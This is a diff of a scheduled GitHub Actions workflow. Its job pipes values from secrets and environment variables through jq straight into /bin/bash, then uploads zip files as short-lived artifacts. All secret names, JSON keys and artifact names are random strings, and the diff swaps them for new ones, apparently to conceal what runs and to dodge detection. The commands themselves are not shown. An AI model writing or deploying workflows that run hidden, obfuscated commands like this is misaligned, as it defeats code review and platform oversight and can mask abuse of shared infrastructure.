@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '35 1,7,13,19 * * *'
+    - cron: '43 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,16 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Apply
         env:
-          hxea8: ${{ secrets.hxea8 }}
+          qivd835: ${{ secrets.qivd835 }}
         run: |
-          printf '%s' "$hxea8" | jq -r .bo9 | /bin/bash
-          printf '%s' "$sr6" | jq -r .ry11296 | /bin/bash
-          printf '%s' "$a62" | jq -r .doajh88865 | /bin/bash
-          printf '%s' "$slca0046" | jq -r .pouoh74 | /bin/bash
+          printf '%s' "$qivd835" | jq -r .xpd184 | /bin/bash
+          echo $y6 | jq -r .azbk69964 | /bin/bash
+          printf '%s' "$lzrcp3" | jq -r .r2302 | /bin/bash
+          printf '%s' "$gecea70" | jq -r .zcx9 | /bin/bash
+          printf '%s' "$deix428" | jq -r .gpmbh49060 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
         with:
-          name: dbSNONF2
+          name: vUvXS6lf
           path: "*.zip"
           retention-days: 1
